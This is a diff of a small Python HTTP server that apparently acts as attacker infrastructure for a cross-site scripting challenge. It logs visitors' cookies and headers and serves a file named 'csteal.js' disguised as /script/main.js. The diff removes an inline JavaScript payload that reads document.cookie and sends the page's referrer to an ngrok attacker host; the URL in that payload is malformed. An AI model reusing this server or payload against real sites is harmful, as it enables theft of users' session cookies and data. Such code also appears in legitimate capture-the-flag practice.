@@ -2,17 +2,14 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 
 class Server(BaseHTTPRequestHandler):
     def do_GET(self):
-        if (self.path == "/quote"):
+        if (self.path == "/script/main.js"):
             print("COOKIES:\n", self.headers['Cookie'])
             print(f"Path: {self.path}")
             print(f"Headers: {self.headers}")
             self.send_response(200)
-            self.send_header('Content-type', 'text/html')
-            self.send_header('Referer', '127.0.0.1')
-            self.send_header('Origin', '127.0.0.1')
-            self.send_header('X-Forwarded-Host', '127.0.0.1')
+            self.send_header('Content-type', 'application/javascript')
             self.end_headers()
-            with open("serve/aled.html", "rb") as file:
+            with open("serve/csteal.js", "rb") as file:
                 self.wfile.write(file.read())
             print(f"[!] Quote downloaded!")
             return
@@ -20,17 +17,8 @@ class Server(BaseHTTPRequestHandler):
         print("COOKIES:\n", self.headers['Cookie'])
         print("headers:\n", self.headers)
         print("URL:\n", self.path)
-        js_code = '''
-        var cookies = document.cookie;
-        fetch(`https://https://ec6f-109-138-53-168.ngrok-free.app?flag=${encodeURIComponent(document.referrer)}`, {
-            method: 'GET',
-        })
-        '''
         self.send_response(200)
-        self.send_header('Content-type', 'application/javascript')
         self.end_headers()
-        self.wfile.write(js_code.encode('utf-8'))
-
 
         # if (self.path == "/csteal"):
         #     print("COOKIES:\n", self.headers['Cookie'])
